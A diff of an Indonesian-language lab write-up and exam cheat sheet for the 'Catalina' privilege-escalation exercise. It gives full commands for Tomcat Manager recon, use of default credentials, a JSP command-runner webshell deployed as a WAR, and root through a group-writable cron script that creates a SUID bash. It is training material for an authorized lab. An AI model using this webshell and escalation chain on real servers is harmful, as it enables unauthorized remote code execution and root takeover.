@@ -1,336 +1,315 @@
-# Write-Up Privilege Escalation Lab Catalina
+# Write-Up Lab Catalina — Panduan Ujian Close Book
 
-> **Versi ringkas untuk pelatihan dan ujian closed book**  
 > **Ruang lingkup:** hanya untuk laboratorium atau sistem yang telah memberikan izin pengujian.
 
----
+## 0. Cara Menggunakan Catatan Ini
 
-## 1. Ringkasan Lab
-
-| Komponen | Informasi |
-|---|---|
-| Target | `192.168.56.117` |
-| Port utama | `8081/tcp` |
-| Service | Apache Tomcat |
-| Endpoint penting | `/manager` |
-| Credential | `tomcat:s3cret` |
-| Foothold | RCE sebagai user `tomcat` |
-| Privilege escalation | Cron root menjalankan script writable |
-| Akses akhir | `root` |
-
-Rantai serangan:
+Pelajari dokumen ini dalam tiga lapisan:
 
 ```text
-Tomcat Manager ditemukan
-→ credential lemah berhasil digunakan
-→ file WAR di-deploy
-→ command berjalan sebagai tomcat
-→ ditemukan cron root
-→ script cron writable oleh group tomcat
-→ payload dijalankan sebagai root
+Lapisan 1: hafalkan rantai serangan dan mnemonic.
+Lapisan 2: hafalkan indikator berhasil pada setiap fase.
+Lapisan 3: latih command pada Cheat Sheet 60 Detik.
 ```
 
 ---
 
-## 2. Mnemonic: M-W-C-R
+## 1. Peta Serangan
+
+| Komponen | Nilai |
+|---|---|
+| Target | `192.168.56.117:8081` |
+| Hostname | `catalina` |
+| Service utama | Apache Tomcat |
+| Celah awal | Tomcat Manager terekspos dan credential lemah |
+| Credential | `tomcat:s3cret` |
+| Foothold | Deploy WAR dan RCE sebagai `tomcat` |
+| Privilege escalation | Root cron menjalankan script yang writable oleh group `tomcat` |
+| Akses akhir | `euid=0(root)` |
+
+### Rantai Serangan
 
 ```text
-M = Manager
+Recon
+→ Tomcat Manager
+→ credential tomcat:s3cret
+→ deploy WAR
+→ RCE sebagai tomcat
+→ temukan root cron
+→ script backup group-writable
+→ SUID bash
+→ root
+```
+
+### Mnemonic: R-C-W-C-R
+
+```text
+R = Recon
+C = Credential
 W = WAR
 C = Cron
 R = Root
 ```
 
-Kalimat hafalan:
+### Checkpoint Ujian
 
-```text
-Cari Manager, deploy WAR, periksa Cron, lalu menjadi Root.
-```
-
-Empat command konsep yang perlu diingat:
-
-```bash
-dirsearch -u http://192.168.56.117:8081
-
-curl -u tomcat:s3cret \
-  http://192.168.56.117:8081/manager/text/list
-
-curl -u tomcat:s3cret --upload-file labcmd.war \
-  "http://192.168.56.117:8081/manager/text/deploy?path=/labcmd&update=true"
-
-curl -sG --data-urlencode "cmd=id" \
-  http://192.168.56.117:8081/labcmd/cmd.jsp
-```
+| Fase | Indikator yang Dicari |
+|---|---|
+| Recon | `/manager/html` menghasilkan `401` |
+| Credential | `/manager/text/list` menghasilkan `OK` |
+| WAR | `uid=997(tomcat)` |
+| Cron | `* * * * * root /opt/backup/backup.sh` |
+| Permission | `-rwxrwxr-x root tomcat` |
+| Root | `euid=0(root)` |
 
 ---
 
-# Fase 1 — Menemukan Tomcat Manager
+# Fase 1 — Recon Tomcat Manager
 
-## 3. Scan Target
+## 2. Tujuan
+
+Menemukan service Tomcat dan memastikan endpoint administrasi tersedia.
+
+## 3. Scan Service dan Direktori
 
 ```bash
 TARGET="192.168.56.117"
-BASE="http://$TARGET:8081"
+WEB="http://192.168.56.117:8081"
 
 nmap -Pn -sC -sV -p8081 "$TARGET"
+
+dirsearch \
+  -u "$WEB" \
+  -e jsp,html,txt
 ```
 
-Hasil yang dicari:
+Temuan penting:
 
 ```text
-8081/tcp open
-Apache Tomcat
+302 - /manager  → /manager/
+302 - /manager/ → /manager/html
+401 - /manager/html
+401 - /manager/jmxproxy
+401 - /manager/status/all
 ```
 
-Lanjutkan dengan directory enumeration:
+## 4. Validasi Manual
 
 ```bash
-dirsearch -u "$BASE"
-```
-
-Endpoint penting:
-
-```text
-/manager
-/manager/html
-/manager/status
-```
-
-### Arti Status `401`
-
-Apabila `/manager/html` menghasilkan:
-
-```text
-HTTP/1.1 401 Unauthorized
-```
-
-jangan langsung menganggap endpoint gagal.
-
-Artinya:
-
-```text
-Endpoint ada
-+
-autentikasi diperlukan
-```
-
-Validasi manual:
-
-```bash
-curl -i "$BASE/manager/html"
+curl -i "$WEB/manager/html"
 ```
 
 Indikator:
 
 ```text
+HTTP/1.1 401
 WWW-Authenticate: Basic realm="Tomcat Manager Application"
+```
+
+Makna:
+
+```text
+401 bukan berarti endpoint tidak ada.
+401 membuktikan endpoint tersedia dan meminta autentikasi.
 ```
 
 ---
 
-## 4. Mencari Credential
+# Fase 2 — Credential Tomcat Manager
 
-Jalankan Nikto:
+## 5. Tujuan
+
+Mendapatkan dan memvalidasi credential yang memiliki hak deployment.
+
+## 6. Scanning dengan Nikto
 
 ```bash
-nikto -h "$BASE"
+nikto -h "$WEB"
 ```
 
-Temuan pada lab:
+Temuan lab:
+
+```text
+/manager/html: Default account found
+ID 'tomcat', PW 's3cret'
+```
+
+Credential:
 
 ```text
 Username : tomcat
 Password : s3cret
 ```
 
-Scanner hanya memberi petunjuk. Credential harus divalidasi:
+## 7. Validasi Credential
 
 ```bash
 curl -s \
   -u tomcat:s3cret \
-  "$BASE/manager/text/list"
+  "$WEB/manager/text/list"
 ```
 
-Indikator berhasil:
+Indikator:
 
 ```text
-OK - Listed applications
+OK - Listed applications for virtual host [localhost]
+```
+
+Validasi informasi server:
+
+```bash
+curl -s \
+  -u tomcat:s3cret \
+  "$WEB/manager/text/serverinfo"
 ```
 
 Kesimpulan:
 
 ```text
-Credential valid
-+
-akun dapat mengakses Tomcat Manager Text API
+Credential valid.
+Akun dapat mengakses Tomcat Manager text interface.
 ```
 
 ---
 
-# Fase 2 — Deploy WAR dan Mendapatkan RCE
+# Fase 3 — Deploy WAR dan RCE
 
-## 5. Membuat JSP Command Runner
+## 8. Tujuan
 
-Buat direktori kerja:
+Menyebarkan aplikasi WAR berisi JSP command runner dan memperoleh command execution sebagai user service.
 
-```bash
-mkdir -p ~/catalina-lab/labcmd
-cd ~/catalina-lab/labcmd
-```
-
-Buat `cmd.jsp`:
+## 9. Buat JSP Command Runner
 
 ```bash
+mkdir -p ~/tomcat-lab/labcmd
+cd ~/tomcat-lab/labcmd
+
 cat > cmd.jsp <<'EOF'
 <%@ page import="java.io.*" %>
 <%
 String cmd = request.getParameter("cmd");
-
 if (cmd != null) {
-    Process process = new ProcessBuilder(
-        "/bin/sh",
-        "-c",
-        cmd
-    ).redirectErrorStream(true).start();
+    String[] command = {"/bin/sh", "-c", cmd};
+    Process p = Runtime.getRuntime().exec(command);
+    InputStream in = p.getInputStream();
+    InputStream err = p.getErrorStream();
 
-    BufferedReader reader = new BufferedReader(
-        new InputStreamReader(process.getInputStream())
-    );
-
-    String line;
+    byte[] buffer = new byte[4096];
+    int len;
 
     out.println("<pre>");
-
-    while ((line = reader.readLine()) != null) {
-        out.println(line);
+    while ((len = in.read(buffer)) != -1) {
+        out.write(new String(buffer, 0, len));
     }
-
+    while ((len = err.read(buffer)) != -1) {
+        out.write(new String(buffer, 0, len));
+    }
     out.println("</pre>");
 }
 %>
 EOF
 ```
 
-Paketkan menjadi WAR:
+## 10. Package dan Deploy WAR
 
 ```bash
-cd ~/catalina-lab/labcmd
-zip -r ../labcmd.war .
-cd ..
+zip -r labcmd.war cmd.jsp
 ```
 
-Periksa file:
-
-```bash
-ls -lh labcmd.war
-```
-
----
-
-## 6. Deploy WAR
+Deploy:
 
 ```bash
 curl \
   -u tomcat:s3cret \
   --upload-file labcmd.war \
-  "$BASE/manager/text/deploy?path=/labcmd&update=true"
+  "$WEB/manager/text/deploy?path=/labcmd&update=true"
 ```
 
-Indikator berhasil:
+Indikator:
 
 ```text
 OK - Deployed application at context path [/labcmd]
 ```
 
-Definisikan URL command runner:
+## 11. Validasi RCE
 
 ```bash
-SHELL_URL="$BASE/labcmd/cmd.jsp"
-```
+SHELL_URL="$WEB/labcmd/cmd.jsp"
 
-Uji RCE:
-
-```bash
 curl -sG \
   --data-urlencode "cmd=id" \
   "$SHELL_URL"
 ```
 
-Hasil:
+Indikator:
 
 ```text
 uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
 ```
 
-Kesimpulan:
+Makna:
 
 ```text
-Remote Command Execution berhasil sebagai user tomcat.
+Deployment berhasil.
+JSP diproses oleh Tomcat.
+Command berjalan sebagai user tomcat.
 ```
 
 ---
 
-# Fase 3 — Enumerasi Lokal
+# Fase 4 — Enumerasi Cron dan Permission
 
-## 7. Konfirmasi Konteks User
+## 12. Tujuan
 
-```bash
-curl -sG \
-  --data-urlencode \
-  "cmd=id; whoami; groups; hostname; pwd" \
-  "$SHELL_URL"
-```
+Mencari pekerjaan otomatis yang berjalan sebagai root dan file yang dapat diubah oleh user `tomcat`.
 
-Informasi penting:
-
-```text
-User     : tomcat
-Group    : tomcat
-Hostname : catalina
-Privilege: non-root
-```
-
-Setelah memperoleh foothold, urutan pemeriksaan sederhana adalah:
-
-```text
-sudo
-→ SUID
-→ capability
-→ cron
-→ file atau service writable
-→ kernel exploit
-```
-
-Pada lab Catalina, jalur yang berhasil adalah **cron**.
-
----
-
-## 8. Memeriksa Cron Job
+## 13. Verifikasi Identitas
 
 ```bash
 curl -sG \
   --data-urlencode \
-  "cmd=cat /etc/crontab 2>/dev/null; cat /etc/cron.d/* 2>/dev/null" \
+  "cmd=id; whoami; groups; pwd; hostname" \
   "$SHELL_URL"
 ```
 
-Temuan penting:
+Hasil penting:
 
-```cron
+```text
+tomcat
+catalina
+```
+
+## 14. Enumerasi Cron
+
+```bash
+curl -sG \
+  --data-urlencode \
+  "cmd=cat /etc/crontab 2>/dev/null; ls -lah /etc/cron.d 2>/dev/null" \
+  "$SHELL_URL"
+```
+
+Baca cron custom:
+
+```bash
+curl -sG \
+  --data-urlencode \
+  "cmd=cat /etc/cron.d/backup; stat -c '%A %U %G %n' /etc/cron.d/backup" \
+  "$SHELL_URL"
+```
+
+Temuan:
+
+```text
 * * * * * root /opt/backup/backup.sh
 ```
 
 Artinya:
 
 ```text
-Setiap menit
-→ root
-→ menjalankan /opt/backup/backup.sh
+Setiap menit, root menjalankan /opt/backup/backup.sh.
 ```
 
----
-
-## 9. Memeriksa Permission Script
+## 15. Periksa Permission Script
 
 ```bash
 curl -sG \
@@ -339,35 +318,39 @@ curl -sG \
   "$SHELL_URL"
 ```
 
-Hasil:
+Temuan kritis:
 
 ```text
 -rwxrwxr-x root tomcat /opt/backup/backup.sh
 ```
 
-Cara membaca:
+Interpretasi:
 
 ```text
-Owner root    : rwx
-Group tomcat  : rwx
-Other         : r-x
+Owner root   : rwx
+Group tomcat : rwx
+Other        : r-x
 ```
 
-User yang sedang dikuasai termasuk group `tomcat`, sehingga dapat mengubah script.
+Karena command runner berjalan sebagai user/group `tomcat`, script dapat diubah.
 
-Rumus wajib hafal:
+### Rumus Hafalan
 
 ```text
-Cron root + script writable oleh user rendah = privilege escalation
+root cron + script writable oleh tomcat = command berjalan sebagai root
 ```
 
 ---
 
-# Fase 4 — Membuktikan Privilege Escalation
+# Fase 5 — Root melalui Cron
 
-## 10. Backup Script
+## 16. Tujuan
 
-Simpan script asli:
+Membuktikan eksekusi root, membuat SUID bash untuk shell root, lalu memulihkan script.
+
+## 17. Backup Script dan Proof Non-Destruktif
+
+Backup:
 
 ```bash
 curl -sG \
@@ -376,20 +359,7 @@ curl -sG \
   "$SHELL_URL"
 ```
 
-Periksa backup:
-
-```bash
-curl -sG \
-  --data-urlencode \
-  "cmd=ls -l /tmp/backup.sh.bak" \
-  "$SHELL_URL"
-```
-
----
-
-## 11. Proof of Execution sebagai Root
-
-Tambahkan command non-destruktif:
+Tambahkan proof:
 
 ```bash
 curl -sG \
@@ -398,7 +368,7 @@ curl -sG \
   "$SHELL_URL"
 ```
 
-Setelah cron berjalan, periksa:
+Setelah cron berjalan, cek:
 
 ```bash
 curl -sG \
@@ -411,23 +381,11 @@ Indikator:
 
 ```text
 uid=0(root) gid=0(root)
--rw-r--r-- 1 root root ... /tmp/root_proof
 ```
 
-Bukti tersebut sudah cukup untuk menyimpulkan:
+## 18. Membuat SUID Bash
 
-```text
-Command yang ditulis user tomcat
-dijalankan oleh cron sebagai root.
-```
-
----
-
-# Fase 5 — Mendapatkan Root
-
-## 12. Membuat SUID Bash
-
-Tambahkan payload berikut ke script cron:
+Tambahkan payload:
 
 ```bash
 curl -sG \
@@ -436,7 +394,7 @@ curl -sG \
   "$SHELL_URL"
 ```
 
-Setelah cron berjalan, cek:
+Cek file:
 
 ```bash
 curl -sG \
@@ -445,44 +403,84 @@ curl -sG \
   "$SHELL_URL"
 ```
 
-Indikator SUID:
+Indikator:
 
 ```text
--rwsr-xr-x ... /tmp/rootbash
+-rwsr-xr-x 1 root root ... /tmp/rootbash
 ```
 
-Huruf `s` pada permission owner menunjukkan SUID aktif.
-
-Jalankan Bash dengan mempertahankan effective privilege:
+Jalankan:
 
 ```bash
 curl -sG \
   --data-urlencode \
-  "cmd=/tmp/rootbash -p -c 'id; whoami'" \
+  "cmd=/tmp/rootbash -p -c 'id; whoami; hostname'" \
   "$SHELL_URL"
 ```
 
-Hasil akhir:
+Indikator utama:
 
 ```text
 euid=0(root)
 root
+catalina
 ```
 
-### Mengapa Memakai `-p`?
-
-```text
-/tmp/rootbash  = Bash yang memiliki SUID root
--p             = mempertahankan effective UID
-```
-
-Tanpa `-p`, Bash dapat menurunkan privilege demi keamanan.
+> Opsi `-p` mempertahankan effective UID dari binary SUID.
 
 ---
 
-# Fase 6 — Cleanup
+# 19. Troubleshooting Inti
 
-## 13. Memulihkan Script
+### `/manager/html` menghasilkan `404`
+
+Pastikan port yang digunakan adalah `8081`, bukan port `80`.
+
+### Credential valid di browser tetapi text interface menghasilkan `403`
+
+Akun mungkin tidak memiliki role `manager-script`. Pada lab ini, keberhasilan dibuktikan dengan respons `OK` dari `/manager/text/list`.
+
+### Deploy menghasilkan error
+
+Periksa format WAR:
+
+```bash
+unzip -l labcmd.war
+```
+
+File `cmd.jsp` harus berada di dalam arsip.
+
+### RCE menghasilkan `404`
+
+Periksa context path dan nama file:
+
+```text
+/labcmd/cmd.jsp
+```
+
+### Root proof belum muncul
+
+Cron berjalan setiap menit. Periksa kembali:
+
+```bash
+curl -sG --data-urlencode "cmd=date; cat /tmp/root_proof 2>/dev/null" "$SHELL_URL"
+```
+
+### `/tmp/rootbash` ada tetapi tidak root
+
+Pastikan permission mengandung `s` pada posisi owner:
+
+```text
+-rwsr-xr-x
+```
+
+Jalankan dengan opsi `-p`.
+
+---
+
+# 20. Cleanup
+
+Pulihkan script:
 
 ```bash
 curl -sG \
@@ -491,142 +489,67 @@ curl -sG \
   "$SHELL_URL"
 ```
 
-Hapus file bukti:
+Hapus artefak root:
 
 ```bash
 curl -sG \
   --data-urlencode \
-  "cmd=rm -f /tmp/root_proof /tmp/rootbash /tmp/backup.sh.bak" \
+  "cmd=/tmp/rootbash -p -c 'rm -f /tmp/rootbash /tmp/root_proof /tmp/backup.sh.bak'" \
   "$SHELL_URL"
 ```
 
 Undeploy aplikasi:
 
 ```bash
-curl \
+curl -s \
   -u tomcat:s3cret \
-  "$BASE/manager/text/undeploy?path=/labcmd"
-```
-
-Indikator:
-
-```text
-OK - Undeployed application at context path [/labcmd]
+  "$WEB/manager/text/undeploy?path=/labcmd"
 ```
 
 Hapus file lokal:
 
 ```bash
-rm -rf ~/catalina-lab
+rm -rf ~/tomcat-lab
 ```
 
 ---
 
-# 14. Troubleshooting Singkat
-
-## `/manager/html` Menghasilkan `401`
-
-Itu normal. Endpoint ada dan membutuhkan credential.
-
-## Login Browser Berhasil, tetapi Text API Menghasilkan `403`
-
-Akun mungkin hanya mempunyai role `manager-gui`, bukan `manager-script`. Pada lab ini, pastikan endpoint berikut mengembalikan `OK`:
-
-```bash
-curl -u tomcat:s3cret "$BASE/manager/text/list"
-```
-
-## Deploy Menghasilkan `403`
-
-Periksa:
-
-```text
-Credential benar
-Role manager-script tersedia
-URL menggunakan /manager/text/deploy
-File WAR benar-benar tersedia
-```
-
-## `cmd.jsp` Menghasilkan `404`
-
-Periksa aplikasi yang ter-deploy:
-
-```bash
-curl -u tomcat:s3cret "$BASE/manager/text/list"
-```
-
-Pastikan context path:
-
-```text
-/labcmd
-```
-
-dan URL:
-
-```text
-/labcmd/cmd.jsp
-```
-
-## `root_proof` Belum Muncul
-
-Periksa:
-
-```text
-Cron berjalan setiap menit
-Script benar-benar berubah
-Script tetap executable
-Command tidak salah kutip
-```
-
-Validasi isi script:
-
-```bash
-curl -sG \
-  --data-urlencode \
-  "cmd=tail -n 10 /opt/backup/backup.sh" \
-  "$SHELL_URL"
-```
-
----
-
-# 15. Cheat Sheet 60 Detik
+# 21. Cheat Sheet 60 Detik
 
 ```bash
 TARGET="192.168.56.117"
-BASE="http://$TARGET:8081"
+WEB="http://192.168.56.117:8081"
 
 # 1. Recon
 nmap -Pn -sC -sV -p8081 "$TARGET"
-dirsearch -u "$BASE"
-nikto -h "$BASE"
+dirsearch -u "$WEB" -e jsp,html,txt
+curl -i "$WEB/manager/html"
 
 # 2. Credential
-curl -u tomcat:s3cret "$BASE/manager/text/list"
+nikto -h "$WEB"
+curl -s -u tomcat:s3cret "$WEB/manager/text/list"
 
-# 3. Deploy WAR
+# 3. WAR
+mkdir -p ~/tomcat-lab/labcmd && cd ~/tomcat-lab/labcmd
+# buat cmd.jsp
+zip -r labcmd.war cmd.jsp
 curl -u tomcat:s3cret --upload-file labcmd.war \
-"$BASE/manager/text/deploy?path=/labcmd&update=true"
+"$WEB/manager/text/deploy?path=/labcmd&update=true"
 
 # 4. RCE
-SHELL_URL="$BASE/labcmd/cmd.jsp"
+SHELL_URL="$WEB/labcmd/cmd.jsp"
 curl -sG --data-urlencode "cmd=id" "$SHELL_URL"
 
-# 5. Cron dan permission
+# 5. Cron
+curl -sG --data-urlencode "cmd=cat /etc/cron.d/backup" "$SHELL_URL"
 curl -sG --data-urlencode \
-"cmd=cat /etc/cron.d/backup; stat -c '%A %U %G %n' /opt/backup/backup.sh" \
-"$SHELL_URL"
+"cmd=stat -c '%A %U %G %n' /opt/backup/backup.sh" "$SHELL_URL"
 
-# 6. Backup
-curl -sG --data-urlencode \
-"cmd=cp /opt/backup/backup.sh /tmp/backup.sh.bak" \
-"$SHELL_URL"
-
-# 7. Rootbash
+# 6. Root
 curl -sG --data-urlencode \
 "cmd=printf '\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\n' >> /opt/backup/backup.sh" \
 "$SHELL_URL"
 
-# 8. Root
 curl -sG --data-urlencode \
 "cmd=/tmp/rootbash -p -c 'id; whoami'" \
 "$SHELL_URL"
@@ -634,27 +557,29 @@ curl -sG --data-urlencode \
 
 ---
 
-# 16. Ringkasan Jawaban Ujian
-
-Apabila diminta menjelaskan lab Catalina secara lisan:
+# 22. Checklist Ujian
 
 ```text
-Saya menemukan Apache Tomcat pada port 8081 dan endpoint
-Tomcat Manager. Nikto memberi petunjuk credential tomcat:s3cret,
-lalu saya memvalidasinya melalui Manager Text API.
-
-Akun tersebut dapat melakukan deployment, sehingga saya membuat
-WAR berisi JSP command runner dan memperoleh RCE sebagai user tomcat.
-
-Pada enumerasi lokal, saya menemukan cron root yang setiap menit
-menjalankan /opt/backup/backup.sh. Script tersebut dimiliki root,
-tetapi writable oleh group tomcat. Saya menyisipkan command untuk
-membuat Bash SUID, menunggu cron menjalankannya, lalu memakai
-/tmp/rootbash -p sehingga memperoleh effective UID root.
+[ ] Port 8081 dan Tomcat ditemukan
+[ ] /manager/html menghasilkan 401
+[ ] Credential tomcat:s3cret ditemukan
+[ ] Credential tervalidasi pada text interface
+[ ] WAR berhasil dibuat
+[ ] WAR berhasil dideploy
+[ ] RCE terbukti sebagai tomcat
+[ ] Root cron ditemukan
+[ ] Script backup terbukti group-writable
+[ ] Proof root berhasil
+[ ] SUID bash dibuat
+[ ] euid=0(root) terbukti
+[ ] Script dipulihkan
+[ ] WAR dan artefak dihapus
 ```
 
-Versi satu baris:
+## Kalimat Hafalan
 
 ```text
-Manager → credential → WAR → tomcat → cron writable → SUID Bash → root.
+Cari Manager, validasi tomcat:s3cret, deploy WAR,
+RCE sebagai tomcat, temukan cron root, cek script writable,
+buat SUID bash, jalankan -p, lalu root.
 ```
